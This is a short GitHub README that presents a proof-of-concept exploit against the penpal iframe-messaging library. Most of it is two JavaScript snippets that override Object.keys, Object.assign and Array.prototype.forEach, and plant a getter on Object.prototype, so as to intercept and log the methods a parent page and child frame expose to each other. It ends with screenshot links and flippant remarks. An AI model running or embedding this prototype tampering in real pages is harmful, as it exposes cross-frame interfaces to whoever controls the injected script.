# penpal-vulnerability
very silly exploit in [penpal](https://github.com/Aaronius/penpal) to expose parent and child methods.
can be tested in [penpal-sandbox](https://tarbabyontop.github.io/penpal-sandbox/) to ... uh.. i dont know
# Exposing parent and child methods

Running this before a connection is made between the parent and the child will allow you to intercept the methods. <br>
some additional filtering may be needed because Object.keys and Object.assign are very widely used functions. <br>

```js
let _keys = Object.keys
Object.keys = function () {
    if (typeof Object.values(arguments[0]).at(-1) === 'function') {
        console.log('Parent Methods: ', arguments[0])
    }
    return _keys.apply(this, arguments)
}

let _assign = Object.assign
Object.assign = function () {
    console.log('Child Methods: ', arguments[0])
    return _assign.apply(this, arguments)
}
```

### primative alternate method

```js
let _forEach = Array.prototype.forEach;
Array.prototype.forEach = function () {
    Object.defineProperty(Object.prototype, 'boobies', {
        get() {
            console.log('Methods:', this)
            delete Object.prototype['boobies'];
            return ()=>{}
        },
        set() {},
        configurable: true,
    })
    arguments[0]('boobies');
    
    return _forEach.apply(this, arguments)
}
```

### Locations of vulnerability
screw formatting <br>
![grafik](https://raw.githubusercontent.com/TarBabyOnTop/penpal-vulnerability/main/assets/1.png) <br>
you can figure it out <br>
![grafik](https://raw.githubusercontent.com/TarBabyOnTop/penpal-vulnerability/main/assets/2.png)ðŸ’€ <br>
![grafik](https://raw.githubusercontent.com/TarBabyOnTop/penpal-vulnerability/main/assets/3.png) <br>
ðŸ’€ <br>
![grafik](https://raw.githubusercontent.com/TarBabyOnTop/penpal-vulnerability/main/assets/4.png) <br>
